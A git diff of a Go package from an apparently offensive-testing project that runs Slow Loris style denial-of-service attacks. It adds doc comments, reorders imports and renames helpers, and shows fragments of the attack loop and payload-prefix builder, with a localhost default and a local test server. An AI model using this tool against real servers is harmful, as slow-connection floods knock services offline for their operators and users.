@@ -1,3 +1,4 @@
+// Package loris orchestrates Slow Loris stlye attacks
 package loris
 
 import (
@@ -7,12 +8,11 @@ import (
 	"os"
 	"time"
 
-	"github.com/andrewflbarnes/snacks/pkg/strs"
-	"github.com/andrewflbarnes/snacks/pkg/udy"
-
 	"github.com/andrewflbarnes/snacks/internal/flags"
 	"github.com/andrewflbarnes/snacks/internal/helper"
 	"github.com/andrewflbarnes/snacks/pkg/http"
+	"github.com/andrewflbarnes/snacks/pkg/strs"
+	"github.com/andrewflbarnes/snacks/pkg/udy"
 	log "github.com/sirupsen/logrus"
 )
 
@@ -33,6 +33,7 @@ var (
 	dest *url.URL
 )
 
+// Loris parses the application flags and starts a Slow Loris style attack as required
 func Loris() {
 	flagsLoris.Parse(os.Args[2:])
 	logFlags.Apply()
@@ -43,7 +44,7 @@ func Loris() {
 	} else {
 		urlString = "http://localhost:80"
 	}
-	dest = helper.ParseUrl(urlString)
+	dest = helper.ParseURL(urlString)
 
 	test := *flagTest
 	size := *flagSize
@@ -66,7 +67,7 @@ func Loris() {
 	if test {
 		// Start a server which will receive the payload
 		serverReady := make(chan bool)
-		go helper.HttpServer(dest.Port(), serverReady)
+		go helper.HTTPServer(dest.Port(), serverReady)
 		<-serverReady
 	}
 
@@ -84,13 +85,10 @@ func Loris() {
 		go l.ExecuteContinuous(dest, prefix, size)
 
 		time.Sleep(duration)
-		// l.Stop()
 
 		logger.WithFields(log.Fields{
 			"duration": duration,
 		}).Info("Loris attack complete")
-
-		time.Sleep(sendDelay)
 	}
 }
 
@@ -137,8 +135,8 @@ func getPayloadPrefix() []byte {
 		"Host":           host,
 	}
 
-	builder := http.HttpRequestBuilder{
-		Proto:    http.Http11,
+	builder := http.RequestBuilder{
+		Proto:    http.HTTP11,
 		Verb:     verb,
 		Endpoint: endpoint,
 		Body:     "",
